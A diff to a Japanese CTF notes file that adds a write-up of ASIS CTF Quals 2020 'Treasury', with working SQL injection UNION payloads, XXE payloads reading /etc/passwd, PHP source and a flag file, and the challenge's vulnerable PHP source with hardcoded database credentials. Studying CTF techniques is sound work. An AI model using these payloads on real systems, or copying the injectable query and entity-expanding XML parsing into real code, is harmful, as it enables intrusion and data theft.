@@ -154,10 +154,128 @@ PHP Type Jugglingを使った`SELECT * FROM demo where name="testaa" union selec
 username:`flagman69`,password:`'=0#`  
 username:`flagman' #`  
 `a' union select 0,0,0 #`  
-## 
+## Union query / XXE (ASIS CTF Quals 2020 Treasury #1 #2)
+https://github.com/saw-your-packet/ctfs/blob/master/ASIS%20CTF%20Quals%202020/Write-ups.md#treasury-1  
+https://ctftime.org/writeup/24592  
+https://ctftime.org/writeup/22126  
 - **entrypoint**  
-- **payload**  
+本の抜粋(excerpt)を読めるサイトがある。  
+BurpのSpiderで`books.php?type=excerpt&id=1`をしている箇所があり、これが抜粋を読み込んでいる箇所だと推測。  
+`id=4' or id='3`で3のコンテンツが返ったのでSQLInjection可能とわかる！(4は存在しない)  
+`null' union select 'null`を入力すると`simplexml_load_string()`のerrorとなり、`null`をXMLとして解釈しようとしてエラーが発生しているとわかる。  
+ここから、XXEの脆弱性もあることがわかる。  
+本の抜粋のXMLデータであるはずなので以下のようになっていると推測するらしい？？  
+これで`' UNION SELECT '<root><excerpt>TESTING HERE</excerpt></root>`とするとTESTING HEREが返ったのでXMLはこの構文でいいらしい。  
+```xml
+<root>
+  <excerpt>TESTING HERE</excerpt>
+</root>
+```
+  
+以下で`/etc/passwd`が返るらしい。  
+```txt
+4' union select '<!DOCTYPE excerpt [<!ENTITY test SYSTEM "file:///etc/passwd">]><root><id>4</id><excerpt>&test;</excerpt></root>
+```
+以下で`index.php`が返る。`<`とかが入っているとXML構文エラーとなってしまうため、Base64エンコードする。  
+```txt
+4' union select '<!DOCTYPE excerpt [<!ENTITY test SYSTEM "php://filter/convert.base64-encode/resource=books.php">]><root><id>4</id><excerpt>&test;</excerpt></root>
+```
+以下で`ASISCTF`というデータベース名が返った。  
+```txt
+4' union select concat('<root><id>4</id><excerpt>',database(),'</excerpt></root>') where 'a'='a
+```
+以下でbooksテーブルのinfoカラムの値を表示できる。`REPLACE`で`<`が構文エラーしないように`?`に変更している。  
+これで`#1`のフラグはゲットできるらしい。  
+```txt
+4' union select concat('<root><id>4</id><excerpt>',REPLACE((select group_concat(0x7c,info,0x7c) from books),'<','?'),'</excerpt></root>') where ''='
+```
+これで`#2`のフラグをゲットできるらしい。  
+```txt
+4' union select '<!DOCTYPE excerpt [<!ENTITY test SYSTEM "file:///flag">]><root><id>4</id><excerpt>&test;</excerpt></root>
+```
+PHPソースは以下のようだったらしい。  
+```php
+<?php
+sleep(1);
 
+function connect_to_database() {
+  $link = mysqli_connect("web4-mariadb", "ctfuser", "dhY#OThsdivojq2", "ASISCTF");
+  if (!$link) {
+    echo "Error: Unable to connect to DB.";
+    exit;
+  }
+  return $link;
+}
+
+function fetch_books($condition) {
+  $link = connect_to_database();
+  if ($condition === "") {
+    $where_condition = "";
+  } else {
+    $where_condition = "WHERE $condition";
+  }
+  $query = "SELECT info FROM books $where_condition";
+  if ($result = mysqli_query($link, $query, MYSQLI_USE_RESULT)) {
+    $books_info = array();
+    while($row = $result->fetch_array(MYSQLI_NUM)) {
+      $books_info[] = (string) $row[0];
+    }
+    mysqli_free_result($result);
+  }
+  mysqli_close($link);
+  return $books_info;
+}
+
+function xml2array($xml) {
+  return array(
+    'id' => (string) $xml->id,
+    'name' => (string) $xml->name,
+    'author' => (string) $xml->author,
+    'year' => (string) $xml->year,
+    'link' => (string) $xml->link
+  );
+}
+
+function get_all_books() {
+  $books = array();
+  $books_info = fetch_books("");
+  foreach ($books_info as $info) {
+    $xml = simplexml_load_string($info, 'SimpleXMLElement', LIBXML_NOENT);
+    $books[] = xml2array($xml);
+  }
+  return $books;
+}
+
+function find_book($condition) {
+  $book_info = fetch_books($condition)[0];
+  $xml = simplexml_load_string($book_info, 'SimpleXMLElement', LIBXML_NOENT);
+  return $xml;
+}
+
+$type = @$_GET["type"];
+if ($type === "list") {
+  $books = get_all_books();
+  echo json_encode($books);
+
+} elseif ($type === "excerpt") {
+  $id = @$_GET["id"];
+  $book = find_book("id='$id'");
+  $bookExcerpt = $book->excerpt;
+  echo $bookExcerpt;
+
+} else {
+  echo "Invalid type";
+}
+```
+- **payload**  
+これで`#1`のフラグはゲットできるらしい。  
+```txt
+4' union select concat('<root><id>4</id><excerpt>',REPLACE((select group_concat(0x7c,info,0x7c) from books),'<','?'),'</excerpt></root>') where ''='
+```
+これで`#2`のフラグをゲットできるらしい。  
+```txt
+4' union select '<!DOCTYPE excerpt [<!ENTITY test SYSTEM "file:///flag">]><root><id>4</id><excerpt>&test;</excerpt></root>
+```
 ## 
 - **entrypoint**  
 - **payload**  
